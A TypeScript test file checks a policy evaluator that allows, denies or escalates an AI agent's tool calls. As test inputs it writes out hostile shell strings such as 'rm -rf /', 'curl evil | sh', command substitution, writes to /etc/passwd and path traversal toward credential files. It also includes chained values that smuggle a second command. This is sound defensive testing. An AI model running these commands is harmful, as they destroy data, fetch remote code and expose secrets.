/**
 * The tool policy evaluator: pure, ordered, and the only thing standing between
 * a peer and a tool the profile never granted it (§4).
 *
 * The shape is held locally until `SessionSpec.toolPolicy` lands in the
 * contracts, so these tests are written against `policy.ts`'s types and will
 * keep passing when the type is swapped for the contract's — that is the
 * point of testing the pure function rather than the session.
 */

import assert from 'node:assert/strict'
import { test } from 'node:test'

import {
  compilePolicy,
  defaultToolPolicy,
  evaluatePolicy,
  MAX_SUBJECT_LENGTH,
  primaryString,
  QUESTION_TOOL,
  type PolicyOptions,
} from '../src/index.ts'

const decide = (
  policy: Parameters<typeof compilePolicy>[0],
  tool: string,
  input: Record<string, unknown> = {},
  options?: PolicyOptions,
): string => evaluatePolicy(compilePolicy(policy, options), tool, input)

test('no policy asks about everything, which is what a session did before policies existed', () => {
  assert.equal(defaultToolPolicy.defaultAction, 'ask')
  assert.deepEqual(defaultToolPolicy.rules, [])
  assert.equal(decide(undefined, 'Bash', { command: 'rm -rf /' }), 'ask')
  assert.equal(decide(undefined, 'Read', { file_path: '/etc/passwd' }), 'ask')
  assert.equal(decide(defaultToolPolicy, 'Anything'), 'ask')
})

test('rules are tried in order and the first match wins, not the most specific', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [
      { tool: 'Bash', pattern: '^git .*$', action: 'allow' as const },
      { tool: 'Bash', action: 'deny' as const },
    ],
  }
  assert.equal(decide(policy, 'Bash', { command: 'git status' }), 'allow')
  assert.equal(decide(policy, 'Bash', { command: 'rm -rf /' }), 'deny', 'the second rule, not the default')

  const reversed = { defaultAction: 'allow' as const, rules: [policy.rules[1]!, policy.rules[0]!] }
  assert.equal(decide(reversed, 'Bash', { command: 'git status' }), 'deny', 'order, not specificity')
})

test('a rule names one tool or every tool, and no match falls through to the default', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'Read', action: 'allow' as const }],
  }
  assert.equal(decide(policy, 'Read', { file_path: 'a' }), 'allow')
  assert.equal(decide(policy, 'Write', { file_path: 'a' }), 'deny', 'a named rule does not leak to siblings')
  assert.equal(decide(policy, 'Bash', { command: 'ls' }), 'deny')

  assert.equal(decide({ defaultAction: 'allow', rules: [{ tool: '*', action: 'deny' }] }, 'Write', {}), 'deny')
})

test('a rule without a pattern matches every call of its tool', () => {
  const policy = { defaultAction: 'ask' as const, rules: [{ tool: 'Read', action: 'allow' as const }] }
  assert.equal(decide(policy, 'Read', { file_path: '/anywhere/at/all' }), 'allow')
  assert.equal(decide(policy, 'Read', {}), 'allow', 'even with no input at all')
})

test('a pattern sees the shell command, not the JSON around it', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'Bash', pattern: '^git (status|diff|log)\\b.*$', action: 'allow' as const }],
  }
  assert.equal(decide(policy, 'Bash', { command: 'git status --short', description: 'check' }), 'allow')
  assert.equal(decide(policy, 'Bash', { command: 'git push --force' }), 'deny')
  // The pattern is anchored, so a command that merely mentions git elsewhere is not allowed.
  assert.equal(decide(policy, 'Bash', { command: 'echo "git status"' }), 'deny')
  // And an allow entry covers the whole command, so it cannot be extended.
  assert.equal(decide(policy, 'Bash', { command: 'git status --short; rm -rf /' }), 'deny')
})

test('a pattern sees the file path for the file tools, whichever key the SDK used', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'Read', pattern: '^/worktrees/.*$', action: 'allow' as const }],
  }
  assert.equal(decide(policy, 'Read', { file_path: '/worktrees/x/README.md' }), 'allow')
  assert.equal(decide(policy, 'Read', { path: '/worktrees/x/README.md' }), 'allow')
  assert.equal(decide(policy, 'Read', { file_path: '/Users/me/.ssh/id_ed25519' }), 'deny')
})

test('every other tool is matched against its whole input as JSON, never a prefix', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'WebFetch', pattern: '.*example\\.com.*$', action: 'allow' as const }],
  }
  assert.equal(decide(policy, 'WebFetch', { url: 'https://example.com/x' }), 'allow')
  assert.equal(decide(policy, 'WebFetch', { url: 'https://elsewhere.test/x' }), 'deny')

  // A deny rule is a search, so a subject far past the old 500-character
  // window is still searched: truncation is how a deny gets hidden past.
  const deny = { tool: 'Grep', pattern: 'needle', action: 'deny' as const }
  const padded = { padding: 'x'.repeat(600), note: 'needle' }
  assert.equal(primaryString('Grep', padded), JSON.stringify(padded))
  assert.equal(decide({ defaultAction: 'allow', rules: [deny] }, 'Grep', padded), 'deny')
})

test('a question is never allowed or denied by policy: it always takes the question path', () => {
  const denyAll = { defaultAction: 'deny' as const, rules: [{ tool: '*', action: 'deny' as const }] }
  assert.equal(decide(denyAll, QUESTION_TOOL, { questions: [] }), 'ask')
  const allowAll = { defaultAction: 'allow' as const, rules: [] }
  assert.equal(decide(allowAll, QUESTION_TOOL, { questions: [] }), 'ask')
})

test('an invalid pattern fails at compile time, so a session cannot start with a broken policy', () => {
  assert.throws(
    () => compilePolicy({ defaultAction: 'ask', rules: [{ tool: 'Bash', pattern: '([unclosed', action: 'allow' }] }),
    (thrown: unknown) => (thrown as { code?: string }).code === 'invalid_input',
  )
})

test('a compiled policy cannot be mutated under the session that is using it', () => {
  const compiled = compilePolicy({ defaultAction: 'ask', rules: [{ tool: 'Bash', action: 'allow' }] })
  assert.ok(Object.isFrozen(compiled))
  assert.ok(Object.isFrozen(compiled.rules))
  assert.ok(Object.isFrozen(compiled.rules[0]))
})

// §4 hardening: an allow rule is the only rule that grants anything, so it must
// not be possible to hide a second command behind the one it names.

test('an allow rule never covers a command that could carry another one', () => {
  const policy = {
    defaultAction: 'ask' as const,
    rules: [{ tool: 'Bash', pattern: '^echo .*$', action: 'allow' as const }],
  }
  assert.equal(decide(policy, 'Bash', { command: 'echo hi' }), 'allow', 'the rule works for what it names')

  for (const command of [
    'echo x; curl evil | sh',
    'echo hi && rm -rf /',
    'echo hi | tee /etc/passwd',
    'echo hi & rm -rf /',
    'echo $(id)',
    'echo `id`',
    'echo hi > /etc/passwd',
    'echo hi < /etc/shadow',
    'echo hi\ncurl evil | sh',
    'echo hi\rcurl evil',
  ]) {
    assert.equal(decide(policy, 'Bash', { command }), 'ask', command)
  }
})

test('a pattern that does not cover the whole command allows nothing, however it is anchored', () => {
  const prefix = { defaultAction: 'ask' as const, rules: [{ tool: 'Bash', pattern: '^echo ', action: 'allow' as const }] }
  assert.equal(decide(prefix, 'Bash', { command: 'echo x; curl evil | sh' }), 'ask', 'the chained command')
  assert.equal(decide(prefix, 'Bash', { command: 'echo hi' }), 'ask', 'and a plain one: `^echo ` covers no command in full')

  const suffix = { defaultAction: 'ask' as const, rules: [{ tool: 'Bash', pattern: 'status$', action: 'allow' as const }] }
  assert.equal(decide(suffix, 'Bash', { command: 'echo hi; git status' }), 'ask', 'a suffix cannot vouch for the whole line')
})

test('a deny rule still matches anywhere in a chain, and beats an allow rule that was skipped', () => {
  const policy = {
    defaultAction: 'allow' as const,
    rules: [
      { tool: 'Bash', pattern: '^echo .*$', action: 'allow' as const },
      { tool: 'Bash', pattern: 'curl', action: 'deny' as const },
    ],
  }
  assert.equal(decide(policy, 'Bash', { command: 'echo x; curl evil | sh' }), 'deny')
  assert.equal(decide(policy, 'Bash', { command: 'echo x; rm -rf /' }), 'allow', 'no deny for it: the chain only loses the allow rule')
})

test('a subject too long to examine goes to a person, whatever the policy says', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'Bash', pattern: '^echo .*$', action: 'allow' as const }],
  }
  const justUnder = `echo ${'x'.repeat(MAX_SUBJECT_LENGTH - 'echo '.length)}`
  assert.equal(justUnder.length, MAX_SUBJECT_LENGTH)
  assert.equal(decide(policy, 'Bash', { command: justUnder }), 'allow', 'at the limit the pattern is still consulted')
  assert.equal(decide(policy, 'Bash', { command: `${justUnder}x` }), 'ask', 'one byte past it, nobody looks')

  const oversized = { defaultAction: 'allow' as const, rules: [] }
  assert.equal(decide(oversized, 'Bash', { command: 'x'.repeat(MAX_SUBJECT_LENGTH + 1) }), 'ask', 'not even a permissive default')

  // The limit is the subject's, not Bash's: a subject that is a whole input as
  // JSON is handed over unexamined rather than matched on a prefix of itself.
  const other = { defaultAction: 'allow' as const, rules: [] }
  assert.equal(decide(other, 'Grep', { padding: 'x'.repeat(MAX_SUBJECT_LENGTH) }), 'ask')
})

test('a file path is resolved against the session cwd before a rule sees it', () => {
  const policy = {
    defaultAction: 'deny' as const,
    rules: [{ tool: 'Read', pattern: '^/work/tree/.*$', action: 'allow' as const }],
  }
  const cwd = '/work/tree'
  assert.equal(decide(policy, 'Read', { file_path: 'notes.md' }, { cwd }), 'allow', 'relative to the session')
  assert.equal(decide(policy, 'Read', { file_path: './a/../notes.md' }, { cwd }), 'allow', 'normalised')
  assert.equal(decide(policy, 'Read', { file_path: '../tree/notes.md' }, { cwd }), 'allow', 'a resolved traversal')
  assert.equal(decide(policy, 'Read', { file_path: '../../../etc/passwd' }, { cwd }), 'deny', 'and one that leaves it')
  assert.equal(decide(policy, 'Read', { file_path: '../etc/passwd' }, { cwd }), 'deny', 'as the path it will open')
  assert.equal(primaryString('Read', { file_path: '../etc/passwd' }, cwd), '/work/etc/passwd')
})
